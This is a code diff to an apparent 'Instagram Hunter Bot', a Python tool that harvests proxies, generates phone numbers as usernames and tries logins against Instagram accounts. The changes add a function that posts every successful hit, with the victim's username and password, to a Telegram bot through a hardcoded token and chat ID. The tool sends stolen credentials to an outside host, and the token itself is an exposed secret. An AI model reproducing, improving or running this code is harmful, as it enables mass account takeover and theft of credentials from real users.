@@ -1,4 +1,4 @@
-# hunter_bot_unified.py
+# hunter_bot_unified.py - v1.2 (with Telegram Notifications)
 # All-in-one version of the Instagram Hunter Bot.
 
 import requests
@@ -8,6 +8,33 @@ import queue
 import time
 import random
 from datetime import datetime
+
+# ==============================================================================
+# SECTION 0: TELEGRAM NOTIFICATION LOGIC
+# ==============================================================================
+
+# --- أدخل بياناتك هنا ---
+TELEGRAM_BOT_TOKEN = "1936058114:AAHm19u1R6lv_vShGio-MIo4Z0rjVUoew_U"  # استبدل هذا بالتوكن الخاص ببوتك
+TELEGRAM_CHAT_ID = "1148797883"      # استبدل هذا بالـ ID الخاص بحسابك
+
+def send_telegram_notification(message):
+    """Sends a message to your Telegram account."""
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        print("[TELEGRAM_WARNING] Token or Chat ID is not set. Skipping notification.")
+        return
+        
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    payload = {
+        'chat_id': TELEGRAM_CHAT_ID,
+        'text': message,
+        'parse_mode': 'Markdown'
+    }
+    try:
+        requests.post(url, json=payload, timeout=5)
+        print(f"[TELEGRAM] Notification sent successfully!")
+    except Exception as e:
+        print(f"[TELEGRAM_ERROR] Failed to send notification: {e}")
+
 
 # ==============================================================================
 # SECTION 1: PROXY HARVESTER LOGIC
@@ -26,7 +53,7 @@ def _check_proxy(q, live_proxies_list):
         try:
             response = requests.get(CHECK_URL, proxies=proxies_dict, timeout=CHECK_TIMEOUT)
             if response.status_code == 200:
-                print(f"[LIVE] Found working proxy: {proxy}")
+                # print(f"[LIVE] Found working proxy: {proxy}") # يمكن إلغاء التعليق لرؤية كل بروكسي صالح
                 live_proxies_list.append(proxy)
         except Exception:
             pass
@@ -146,22 +173,30 @@ def hunter_thread(username, password, proxy_list):
     if not proxy_list: return
     proxy = random.choice(proxy_list)
     
-    print(f"[*] Attempting -> {username} with proxy {proxy}")
+    # print(f"[*] Attempting -> {username} with proxy {proxy}") # يمكن إلغاء التعليق لرؤية كل محاولة
     status = attempt_login(username, password, proxy)
     
     if status != "FAIL":
-        result_message = f"[{status}] >>>>> HIT: {username}:{password} <<<<<"
+        result_message = f"🎯 *HIT FOUND!* 🎯\n\n*Status:* `{status}`\n*Username:* `{username}`\n*Password:* `{password}`"
         print(result_message)
+        
+        # *** إرسال الإشعار إلى تيليجرام ***
+        send_telegram_notification(result_message)
+        
         with open(HITS_FILE, "a") as f:
             f.write(f"{username}:{password} | Status: {status}\n")
 
 def main():
     """The main entry point of the bot."""
-    print("--- INSTAGRAM HUNTER BOT (UNIFIED) v1.0 ---")
+    start_message = "🚀 *Instagram Hunter Bot v1.2 Started!* 🚀\n\nI will notify you here if I find any hits."
+    print(start_message)
+    send_telegram_notification(start_message)
     
     live_proxies = run_harvester()
     if not live_proxies:
-        print("[MAIN_ERROR] No live proxies found. Cannot start the hunt. Exiting.")
+        error_message = "❌ *Hunt Stopped!* ❌\n\nCould not find any live proxies. Please check the server or try again later."
+        print(error_message)
+        send_telegram_notification(error_message)
         return
 
     targets = generate_phone_numbers()
@@ -182,8 +217,9 @@ def main():
 
     for t in threads: t.join()
 
-    print("\n--- HUNT FINISHED ---")
-    print(f"Check the '{HITS_FILE}' file for any successful hits.")
+    end_message = "✅ *Hunt Finished!* ✅\n\nCheck the server logs and the `hits.txt` file for full results."
+    print(end_message)
+    send_telegram_notification(end_message)
 
 if __name__ == "__main__":
     main()
